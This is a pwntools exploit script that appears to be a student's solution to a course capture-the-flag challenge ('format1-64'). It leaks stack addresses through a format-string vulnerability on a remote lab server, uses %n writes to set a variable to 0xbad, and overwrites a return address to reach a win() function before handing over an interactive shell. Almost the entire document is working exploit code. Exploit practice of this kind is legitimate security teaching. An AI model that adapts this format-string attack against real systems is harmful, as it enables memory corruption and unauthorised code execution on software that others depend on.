from pwn import *

port = 15206
bpath = './format1-64'
elf = ELF(bpath)
context.binary = elf
context.log_level = 'info'

def leak(param_num):
    """
    This function will construct a format string to leak the value of the
    specified parameter. Note that we have to launch a new process for every leak.
    Consequently, if ASLR is enabled, the code pointers will be from different base addresses.
    """

    p = remote('cs4401shell.walls.ninja', port)

    p.recvline()
    p.recvline()
    p.sendline(f"%{param_num}$p".encode())
    leak_raw = p.recvline().strip()
    leak_value = int(leak_raw, 16)
    p.sendline(b"a")
    p.close()
    return leak_value

for param_num in range(1, 16):
   try:
       # we use context.silent to disable the pwntools output temporarily
       with context.silent:
           leak_value = leak(param_num)
       log.info(f"Address leaked at param {param_num}: {hex(leak_value)}")
   except Exception as e:
       log.info(f"Leak failed at param {param_num}")
       print(e)

print("Done leaking\n\nStarting exploit")
p = remote('cs4401shell.walls.ninja', port)

# put exploit here
addr_win = int(p.recvline()[:-1], 16)
addr_language = int(p.recvline()[:-1], 16)
print('addr win: ', hex(addr_win))
print('addr language:', hex(addr_language))

addr_win = p64(0x5555555548fa + 1)
addr_language = 0x55555575504c

# 1. use printf vulnerability to set langauge = 0xbad
desired_value = 0xbad
fmt_str = f'%{desired_value}s%9n'.encode()

# input starts at last 3 bytes of param 7
# param 7: .....%29
# param 8: 89s%9n..
# param 9: addr_language (8 bytes)
input_param = 9     
payload = fmtstr_payload(9, {input_param: addr_language}, write_size='byte')
payload = b'%2989s%9$n' + b'aa' + p64(addr_language)
print(len(payload))
p.sendline(payload)

# 2. overwrite return address of modoutput() to win()
# return address of modoutput() is either in param 11 or 13
# to calculate the offset: (param_num_ret - param_num_input) * 8 + offset
offset_ret  = ((11 - 8) * 8) + 3
exploit_str = flat({offset_ret: addr_win}, length=64, filler=addr_win)
p.sendline(exploit_str)
p.interactive()



